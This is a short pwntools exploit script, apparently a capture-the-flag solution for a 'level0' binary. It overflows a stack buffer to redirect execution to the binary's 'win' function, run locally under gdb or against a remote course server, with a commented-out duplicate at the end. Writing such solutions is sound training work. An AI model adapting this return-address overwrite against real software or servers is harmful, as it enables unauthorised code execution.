from pwn import *
context.terminal = "tmux splitw -h".split()

e = ELF("./level0")
if args.REMOTE: 
    p =remote("kayle.snu.ac.kr",10004)
else: 
    p = process("./level0")
    gdb.attach(p)
p.sendline(b"X" * 0x20 + p64(0xdeadbeefdeadbeef) + p64(e.symbols['win']+1))

p.interactive()
# if args.REMOTE: 
#     p = process("./level0")
# else:
#     p = remote("kayle.snu.ac.kr",10004)
#     gdb.attach(p)
# p.sendline(b"X" * 0x20 + p64(0xdeadbeefdeadbeef) + p64(e.symbols['win']+1))

# p.interactive()